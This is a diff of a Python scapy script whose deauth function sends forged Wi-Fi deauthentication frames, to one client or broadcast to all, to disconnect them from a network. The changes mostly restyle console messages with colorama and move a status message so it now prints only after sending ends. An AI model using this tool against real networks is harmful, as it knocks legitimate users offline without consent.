@@ -2,7 +2,7 @@ from scapy.all import *
 import sys
 import os
 import sys
-from extras import printcolor
+from colorama import Fore, Back, Style
 
 def deauth(target_mac, gateway_mac, iface):
     # 802.11 frame
@@ -16,7 +16,7 @@ def deauth(target_mac, gateway_mac, iface):
 
     # If not sudo, don't allow to continue
     if not 'SUDO_UID' in os.environ.keys():
-        printcolor('RED', "Permission error. You need root privileges for this feature.")
+        print(f'[{Fore.RED}!{Style.RESET_ALL}] Permission error: {Fore.RED}You need root privileges for this feature.{Style.RESET_ALL}')
         sys.exit()
 
     try:
@@ -26,12 +26,6 @@ def deauth(target_mac, gateway_mac, iface):
             count = None
         else:
             loop = 0
-        # Print  info messages"
-        if verbose:
-            if count:
-                printcolor('YELLOW', f"Sending {count} frames every {inter}s...")
-            else:
-                printcolor('YELLOW', f"Sending frames every {inter}s until CTRL-C is pressed...")
 
         if target_mac.lower() == 'a':
             dot11 = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=gateway_mac, addr3=gateway_mac)
@@ -43,6 +37,14 @@ def deauth(target_mac, gateway_mac, iface):
         # Send the packet
         sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=0)
     except Exception as e:
-        print(f'Error: {e}')
+        print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
     except KeyboardInterrupt:
         sys.exit()
+    else:
+        # Print  info messages"
+        if verbose:
+            if count:
+                print(f"[{Fore.GREEN}+{Style.RESET_ALL}] Sending {count} frames every {inter}s...")
+            else:
+                print(f"[{Fore.GREEN}+{Style.RESET_ALL}] Sending frames every {inter}s until CTRL-C is pressed...")
+
